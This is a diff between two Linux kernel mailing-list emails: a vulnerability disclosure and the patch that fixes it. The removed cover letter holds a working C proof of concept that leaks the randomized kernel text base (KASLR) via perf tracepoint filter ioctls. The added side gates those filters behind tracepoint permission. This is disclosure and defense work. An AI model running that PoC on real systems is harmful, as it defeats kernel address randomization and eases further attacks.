@@ -1,62 +1,64 @@
-Received: from mail-dl2-f42.google.com (mail-dl2-f42.google.com [74.125.229.170])
+Received: from mail-dl2-f36.google.com (mail-dl2-f36.google.com [74.125.229.164])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 034A338AC64
-	for <stable@vger.kernel.org>; Mon, 28 Sep 2026 00:00:51 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.229.170
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E9FC736B921
+	for <stable@vger.kernel.org>; Mon, 28 Sep 2026 00:00:56 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.229.164
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1790553654; cv=none; b=HMP7+Mr4ipQCVyl8h1Mv8f502g+uguPkv57IP7ch5KoiUNONLddGTGEjHwTA43tvC7zquSues/f8heK0vphQk2J8a0a5DKbeXDCU5S2hyV08nRMIWnhwAYca3xmUgQ+lDbGo4SmFuiaBeG3L6aXca7yTKWJoYAtLOo1h+q6MCkE=
+	t=1790553660; cv=none; b=XAM/o9T6/ZqAZUYJsW6pWJ67aoq7P++0ZYA4OGqbZwT4+O7BA+z5f5td78RfY32a+J+YFRrV9pUdgS3UZiDP6SIpr5QcPtixwis4D9Q4DWH/Cd3VVxNc8JKPuuWy68JbORXjQ/VJ/CIID6fhLC7MrkUUjsz47d6gfPpvNfFqi48=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1790553654; c=relaxed/simple;
-	bh=xAV81QeqR4ZtpFqOVKF9+IHtT4wTiC4bAZ5jEUD3yEo=;
-	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=pO3Zo+CVc2fyLBGiKegrFk1x/LC4YfYOW6XFL5W3jwANKpybjXcE37ljcXK0xbb7CeeoRCL9Un6qQ66gSJWntjHBlCU8jDpuqURdvhPDkrECNclV87zrRr4Cw2oXd3cIqF1tEJhAzFEJDbVjlqPmgMiySTXLnEEDTl8ifEMWhes=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=rBT9DDkT; arc=none smtp.client-ip=74.125.229.170
+	s=arc-20240116; t=1790553660; c=relaxed/simple;
+	bh=xWkv0NihhCtba8cbXTsytw0F5OHSkub8FBy2TOh+/n0=;
+	h=From:To:Cc:Subject:Date:Message-Id:In-Reply-To:References:
+	 MIME-Version; b=tocyS5+u3BiSkckYYvG7wntIZhv8R+9vfqcXkzPaQnuSswMFqHIXmvKIg4BS4IMIEia4cxr5GT9QmOhlxhS9uxsxYeOCc+zNMWEoLKv+qy3cRvAT2robVblRgmUjh4zqvy3bWLOtyqQclVhGXnFrNUgqe8RWj40NUNcS98GHQ54=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=JlHGzwzX; arc=none smtp.client-ip=74.125.229.164
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="rBT9DDkT"
-Received: by mail-dl2-f42.google.com with SMTP id a92af1059eb24-144e32aaa1cso1275886c88.2
-        for <stable@vger.kernel.org>; Sun, 27 Sep 2026 17:00:50 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="JlHGzwzX"
+Received: by mail-dl2-f36.google.com with SMTP id a92af1059eb24-14373bcc010so2072699c88.1
+        for <stable@vger.kernel.org>; Sun, 27 Sep 2026 17:00:56 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1790553649; x=1791158449; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=SgLgFlJ5lNb0xBi63DpiDCEsIJzMQgnYp0doLWd9kSc=;
-        b=rBT9DDkTXPWbjkWwrBHqlqaEKQ/ZD8ADHrbJ7+ys2B1XLtdVYmXbuzK3XUVEqu7O0N
-         F+5PBYuzHUqv7HHitPBC+xPjVhaSCv04lWbCn8RS4x3pf6EWjDVWIMu75O6C8BjBqPOE
-         7TXOQvLLy238pw3S8sNuePOAzrONfGgy+OzTHg8QZ03VuWa4dDUk0/BOBhA63K+RzocM
-         Yr/0woGNn8GBQzhk0z8zRXcpI05CCkbhQHAjToWg9cga1oN6JSO1OFS9umxVKg+iQ1Yr
-         N1vjCxg5Xmk/6AU5Vx/sHMpaRfoOhbDXIvvlu17yDPSoAjBkvUGJW4GN9K0UsNrpFeZa
-         b/JQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1790553649; x=1791158449;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=gmail.com; s=20251104; t=1790553654; x=1791158454; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=SgLgFlJ5lNb0xBi63DpiDCEsIJzMQgnYp0doLWd9kSc=;
-        b=ba/AgojfSaPotMcjTyFXcC4TeN9n4wNn3Bzq4tC61pS6OUc0kRbHjaFGFp8ntx4qxf
-         QLaBm7Nj/k7Gayw02by7sVAE4wMHDD2yyDcdHZq30tJr5h/UPRnALeDL+SkU38fYekKO
-         8ie/JDCczbvgj5EOrpFt9Sm9rIFjgafpwIHEyfWt/rO134xgwI0UpTmzUjylTJ8nUlqG
-         4WgCDKymJxn9fE9bzqPZD4b7RK3k/eQ0Lof+qTdRcUzg02zIczd6KwPV9m/jHs0gcFOI
-         TKc52DyQ/k4nEww/08hia+Ub0RMkuYZxkHmaUTlRMmQDnRq/mnBFYFqpd+kpfafA5GWm
-         ICeg==
-X-Forwarded-Encrypted: i=1; AKwUvByr6IY37rKnMbvrCu3wXY8DV/a/iAOuoSovC9/Lopu6aP3kXdGIV9cp8eLfGiF0wGocmE2sLaE=@vger.kernel.org
-X-Gm-Message-State: AFuF++nVWTuXroqki54P/CyUs+aVFUfrKbxrmr41T516AOdyltbGP3VK
-	bEN7x/u/IjS/tjYuAM3PC7pNMzKREgkMV9AmE7Y/TUM4eT4lIUjGklTU
-X-Gm-Gg: AYBFou3Pm/XgqLzUwzcUSTVCD1bji99+HLu93anLxLxwRBXTXaSI6/+bWrOPX46K3dI
-	kpUz8ePg0nBCDZs3E7OxGSOuBmJTbQb58W38omReP+WjdlCsvA4innd4/AM0goCnv6URA2KoAA4
-	awlaDQphxgvO0Wmw3ZVNUykhk5qU5P9Uclp+D4Jq+diw1ZsHO6P+rOgYt5TXHsNaSMQVe48SbsC
-	O3ZYmsJ9vx6USfEEnS+5S8cv/K7VJt/4PusrIFExsllTvsrQS47NKYxw7qWA3EERSicgmrgdI+W
-	Dz33bLhKzdc8WLGJMCiSED/3jnQ7d5TEIek9zTRvReo8LBGIX2ZQNNIp7x+W3FXy94Aw4Mb9fsD
-	YOKtC9kw5YJV7zVSMKXzmTHqGedQY6+y6a4LZF2ezEPm5JsFBrbrL2AasQTwriA5r3yz8X93wZ6
-	N9sk0cdnwpsKOAEIfJxDrHIoD1AsB48GiO/ooky0tspxIhlklfkHqpF4WCIOJVd4UFfDG9tadQY
-	25CuG6F
-X-Received: by 2002:a05:7022:f84:b0:13f:ad08:4497 with SMTP id a92af1059eb24-146ce1a80ffmr12159470c88.4.1790553647655;
-        Sun, 27 Sep 2026 17:00:47 -0700 (PDT)
+        bh=b5cgQdvrBNSADM3zuXYKc6bozW58YifUapijoQlKriE=;
+        b=JlHGzwzXcrQgKJrInmJDcWONF29/yJ5zQZsQFMI7jKts8OntGJ5IGd3ns6kdCLRe+r
+         w8dH3kBwL5f9xI6N0FgA19j10pdgz2/s8EbZb2vz4A1njy90UW2sEQ7sfgeT9ohkkpjQ
+         VrlbKsdFBQWm7epF0smaBbd/AzfNpMcp7Ywk6z0mAZa+JwP9vEzucx2jPvmKCcVHTKJ3
+         KJIvQx15E3/uFjggBswfUWW36oAB3zYSTL7EFIR5ih62MLBwVbzaEgqQnPlqicb/ZAF8
+         cTwOQOcarP88rG4fL2SA5C6jirCNWYM97h7zDPMe5zGy9kcAB9ZSGjTb4eGWyE8NRAq5
+         JOkA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1790553654; x=1791158454;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=b5cgQdvrBNSADM3zuXYKc6bozW58YifUapijoQlKriE=;
+        b=YcsBbDNauRmpQ2FIAX+CoaGNQD5xoIi+Lq6GXemYlw0YiOG5/drmXiBNNDEy3dPnvr
+         juz6w+JysSeFeDW4lw3NNDz7aEHTQv3WrpArfeBv1dc5T56ZBaSO/Fhelj5neFQwhyG8
+         yQpew9h7pEZ3HJydSaayPIz3wYasbehoQUGlYgNenaA6ULA3XNWZCtDrJfT/5eiA3O3w
+         6BpmZ+rp7c9nZ8GtDGppKyseVFJLGZCWZI6BFg+DNJYkE3sKl/K0pmhytZoHe+qyJzAH
+         2QCipTqUON9HaoPDeXzo+H6jutaUSeIcxNJr9uONd+6i4kEcyYSXUfdt0WTkzNUwha+d
+         zwlg==
+X-Forwarded-Encrypted: i=1; AKwUvByHl11CdNmh3Ed570UA3UJj+5x+bI4FzLEzCDepKfwxxCdf8l73yKOuxQfso4hVrctbCmsyCMI=@vger.kernel.org
+X-Gm-Message-State: AFuF++lrPge/IQY47NOIEs5s5NvqZ0DnNHwA+YszWM0u9b0iqJh+X7w8
+	02j2W0kBWHX7SQeXhvMiveKMqWUSVka4QYLFmuvKKzdP1qvu+r0012TN
+X-Gm-Gg: AYBFou3PeWc0SnGQE26kFSrtNusrKPVdebwZ7/YxIESeHUKekC0vho9BqvW0mBnE2A5
+	rqgUarxN4bflYfjY470CpWC+YViAdXOT00HpOR2GXs20vBU0FtyFXfwZa72JKvbdMV1s0bEOgm7
+	Q6d8fB7IMMQPB52jtLeKjf+eNJ18aEf80pCNpVY1dUqmvEaBeS8yVm69u2PjFRpaBmJfYnDNS7M
+	3jg7HQ/wN9GUeSd2nskxJprVGBLjAxwpDRzzujg7d6jAq9iF64OI1s3AZyHgwu7M8qb+Ov6wDH3
+	I993+XwIuY0/UazO6jadVX6oOrjmcQ/wgEchHjlu7dArOqzGzi+VAt+hC4j2CGMxJL5KpmHOOt3
+	By2vWP+VurfKtnqEd4bk5WLiW3zG1f62OYMYWs2b8fSEwL8TYvtBcPSWuY1cullp8KdL2KXRwX2
+	pv/zegOxFBjnc2h96y20eZnJIWQmBoWLoFqsdlOCtV6e1YCs6XrGqPHs0e3vGvtFW/+aM5uIJHq
+	BarZobPfk+itIvwDM4=
+X-Received: by 2002:a05:701b:2406:b0:138:243e:ceb1 with SMTP id a92af1059eb24-146ce1a9961mr7838998c88.6.1790553654259;
+        Sun, 27 Sep 2026 17:00:54 -0700 (PDT)
 Received: from kq.cs.ucr.edu (kq.cs.ucr.edu. [169.235.27.223])
-        by smtp.gmail.com with ESMTPSA id a92af1059eb24-145acc47ab8sm23752109c88.6.2026.09.27.17.00.41
+        by smtp.gmail.com with ESMTPSA id a92af1059eb24-145acc47ab8sm23752109c88.6.2026.09.27.17.00.52
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Sun, 27 Sep 2026 17:00:42 -0700 (PDT)
+        Sun, 27 Sep 2026 17:00:53 -0700 (PDT)
 From: Zhengchuan Liang <zcliangcn@gmail.com>
 To: Steven Rostedt <rostedt@goodmis.org>
 Cc: Masami Hiramatsu <mhiramat@kernel.org>,
@@ -68,10 +70,12 @@ Cc: Masami Hiramatsu <mhiramat@kernel.org>,
 	linux-perf-users@vger.kernel.org,
 	stable@vger.kernel.org,
 	Zhengchuan Liang <zcliangcn@gmail.com>
-Subject: [PATCH 0/1] perf tracepoint filter exposes the kernel text base
-Date: Sun, 27 Sep 2026 17:00:30 -0700
-Message-Id: <cover.1790553331.git.zcliangcn@gmail.com>
+Subject: [PATCH 1/1] tracing: Require tracepoint permission for perf function filters
+Date: Sun, 27 Sep 2026 17:00:31 -0700
+Message-Id: <95d3721fa8d4c7a4577ec14e9d7caec4fd0cefcc.1790553331.git.zcliangcn@gmail.com>
 X-Mailer: git-send-email 2.25.1
+In-Reply-To: <cover.1790553331.git.zcliangcn@gmail.com>
+References: <cover.1790553331.git.zcliangcn@gmail.com>
 Precedence: bulk
 X-Mailing-List: stable@vger.kernel.org
 List-Id: <stable.vger.kernel.org>
@@ -80,60 +84,160 @@ List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi,
+Count-only perf tracepoint events can be opened without tracepoint
+permission because they do not sample raw event data. Their SET_FILTER
+ioctl still parses .function predicates. Numeric operands call
+kallsyms_lookup_size_offset(), making ioctl success an oracle for
+recovering the randomized kernel text base. Symbolic operands resolve
+hidden symbol addresses and can also match user-controlled event fields
+against those addresses.
 
-I found and validated an information leak in
-kernel/trace/trace_events_filter.c. An unprivileged user can recover the
-randomized kernel text base, revealing the kernel's KASLR slide, by
-observing PERF_EVENT_IOC_SET_FILTER return values for a disabled,
-count-only perf tracepoint event.
+Pass the perf origin through filter parsing and require
+perf_allow_tracepoint() before resolving either form of .function
+operand. Ordinary perf count filters and tracefs event filters retain
+their existing behavior.
 
-Such an event can be opened with exclude_kernel=1 and sample_type=0. The
-ioctl nevertheless accepts .function predicates. A numeric operand is
-passed to kallsyms_lookup_size_offset(), so success distinguishes an
-address in the kernel image from one outside it. A symbolic operand
-likewise resolves a kernel symbol internally and can compare its address
-with a task-controlled tracepoint field.
+Fixes: e6745a4da964 ("tracing: Add a way to filter function addresses to function names")
+Cc: stable@vger.kernel.org
+Assisted-by: LLM
+Signed-off-by: Zhengchuan Liang <zcliangcn@gmail.com>
+---
+ kernel/trace/trace_events_filter.c | 39 ++++++++++++++++++++++--------
+ 1 file changed, 29 insertions(+), 10 deletions(-)
 
-Here is a minimized numeric PoC for an x86_64 kernel built with
-CONFIG_KALLSYMS_ALL=y. The scan uses 2 MiB steps, the minimum permitted
-value of CONFIG_PHYSICAL_ALIGN on x86_64, and covers the 1 GiB virtual
-KASLR window. Event ID 5 identifies the built-in TRACE_PRINT event.
-The upstream default is perf_event_paranoid=2. Some distributions retain
-that setting, while others use a stricter value. With the default
-setting, run the PoC as an unprivileged user:
+diff --git a/kernel/trace/trace_events_filter.c b/kernel/trace/trace_events_filter.c
+index 2b46ca536045..f99b0f1e32d8 100644
+--- a/kernel/trace/trace_events_filter.c
++++ b/kernel/trace/trace_events_filter.c
+@@ -1625,12 +1625,18 @@ static int filter_pred_fn_call(struct filter_pred *pred, void *event)
+ 	}
+ }
+ 
++struct event_filter_parse_data {
++	struct trace_event_call *call;
++	bool from_perf;
++};
++
+ /* Called when a predicate is encountered by predicate_parse() */
+ static int parse_pred(const char *str, void *data,
+ 		      int pos, struct filter_parse_error *pe,
+ 		      struct filter_pred **pred_ptr)
+ {
+-	struct trace_event_call *call = data;
++	struct event_filter_parse_data *parse_data = data;
++	struct trace_event_call *call = parse_data->call;
+ 	struct ftrace_event_field *field;
+ 	struct filter_pred *pred = NULL;
+ 	unsigned long offset;
+@@ -1686,6 +1692,12 @@ static int parse_pred(const char *str, void *data,
+ 		function = true;
+ 		i += len;
+ 	}
++	if (function && parse_data->from_perf) {
++		/* Both numeric and symbolic operands resolve kernel addresses. */
++		ret = perf_allow_tracepoint();
++		if (ret)
++			return ret;
++	}
+ 
+ 	while (isspace(str[i]))
+ 		i++;
+@@ -2205,8 +2217,13 @@ static int calc_stack(const char *str, int *parens, int *preds, int *err)
+ static int process_preds(struct trace_event_call *call,
+ 			 const char *filter_string,
+ 			 struct event_filter *filter,
+-			 struct filter_parse_error *pe)
++			 struct filter_parse_error *pe,
++			 bool from_perf)
+ {
++	struct event_filter_parse_data data = {
++		.call = call,
++		.from_perf = from_perf,
++	};
+ 	struct prog_entry *prog;
+ 	int nr_parens;
+ 	int nr_preds;
+@@ -2232,7 +2249,7 @@ static int process_preds(struct trace_event_call *call,
+ 		return -EINVAL;
+ 
+ 	prog = predicate_parse(filter_string, nr_parens, nr_preds,
+-			       parse_pred, call, pe);
++			       parse_pred, &data, pe);
+ 	if (IS_ERR(prog))
+ 		return PTR_ERR(prog);
+ 
+@@ -2281,7 +2298,8 @@ static int process_system_preds(struct trace_subsystem_dir *dir,
+ 		if (!filter->filter_string)
+ 			goto fail_mem;
+ 
+-		err = process_preds(file->event_call, filter_string, filter, pe);
++		err = process_preds(file->event_call, filter_string, filter, pe,
++				    false);
+ 		if (err) {
+ 			filter_disable(file);
+ 			parse_error(pe, FILT_ERR_BAD_SUBSYS_FILTER, 0);
+@@ -2377,6 +2395,7 @@ static void create_filter_finish(struct filter_parse_error *pe)
+  * @call: trace_event_call to create a filter for
+  * @filter_string: filter string
+  * @set_str: remember @filter_str and enable detailed error in filter
++ * @from_perf: require tracepoint permission for function predicates
+  * @filterp: out param for created filter (always updated on return)
+  *           Must be a pointer that references a NULL pointer.
+  *
+@@ -2391,7 +2410,7 @@ static void create_filter_finish(struct filter_parse_error *pe)
+  */
+ static int create_filter(struct trace_array *tr,
+ 			 struct trace_event_call *call,
+-			 char *filter_string, bool set_str,
++			 char *filter_string, bool set_str, bool from_perf,
+ 			 struct event_filter **filterp)
+ {
+ 	struct filter_parse_error *pe = NULL;
+@@ -2405,7 +2424,7 @@ static int create_filter(struct trace_array *tr,
+ 	if (err)
+ 		return err;
+ 
+-	err = process_preds(call, filter_string, *filterp, pe);
++	err = process_preds(call, filter_string, *filterp, pe, from_perf);
+ 	if (err && set_str)
+ 		append_filter_err(tr, pe, *filterp);
+ 	create_filter_finish(pe);
+@@ -2418,7 +2437,7 @@ int create_event_filter(struct trace_array *tr,
+ 			char *filter_str, bool set_str,
+ 			struct event_filter **filterp)
+ {
+-	return create_filter(tr, call, filter_str, set_str, filterp);
++	return create_filter(tr, call, filter_str, set_str, false, filterp);
+ }
+ 
+ /**
+@@ -2476,7 +2495,7 @@ int apply_event_filter(struct trace_event_file *file, char *filter_string)
+ 		return 0;
+ 	}
+ 
+-	err = create_filter(file->tr, call, filter_string, true, &filter);
++	err = create_filter(file->tr, call, filter_string, true, false, &filter);
+ 
+ 	/*
+ 	 * Always swap the call filter with the new filter
+@@ -2721,7 +2740,7 @@ int ftrace_profile_set_filter(struct perf_event *event, int event_id,
+ 	if (event->filter)
+ 		return -EEXIST;
+ 
+-	err = create_filter(NULL, call, filter_str, false, &filter);
++	err = create_filter(NULL, call, filter_str, false, true, &filter);
+ 	if (err)
+ 		goto free_filter;
+ 
+@@ -2868,7 +2887,7 @@ static __init int ftrace_test_event_filter(void)
+ 		int err;
+ 
+ 		err = create_filter(NULL, &event_ftrace_test_filter,
+-				    d->filter, false, &filter);
++				    d->filter, false, false, &filter);
+ 		if (err) {
+ 			printk(KERN_INFO
+ 			       "Failed to get filter for '%s', err %d\n",
+-- 
+2.34.1
 
-  #define _GNU_SOURCE
-  #include <linux/perf_event.h>
-  #include <stdio.h>
-  #include <sys/ioctl.h>
-  #include <sys/syscall.h>
-  #include <unistd.h>
-
-  int main(void)
-  {
-          struct perf_event_attr a = {
-                  .type = PERF_TYPE_TRACEPOINT, .size = sizeof(a),
-                  .config = 5, .disabled = 1, .exclude_kernel = 1,
-          };
-          int fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
-          char filter[64];
-
-          if (fd < 0)
-                  return 1;
-          for (unsigned long long p = 0xffffffff80000000ULL;
-               p < 0xffffffffc0000000ULL; p += 0x200000ULL) {
-                  snprintf(filter, sizeof(filter),
-                           "ip.function == 0x%llx", p);
-                  if (!ioctl(fd, PERF_EVENT_IOC_SET_FILTER, filter)) {
-                          printf("_stext=0x%llx\n", p);
-                          return 0;
-                  }
-          }
-          return 2;
-  }
-
-I reproduced the leak under these conditions as an unprivileged user on
-a kernel built from the current upstream tree. The reported _stext
-matched the value in /proc/kallsyms as read by root. The PoC needs no
-tracefs access or perf sample data.
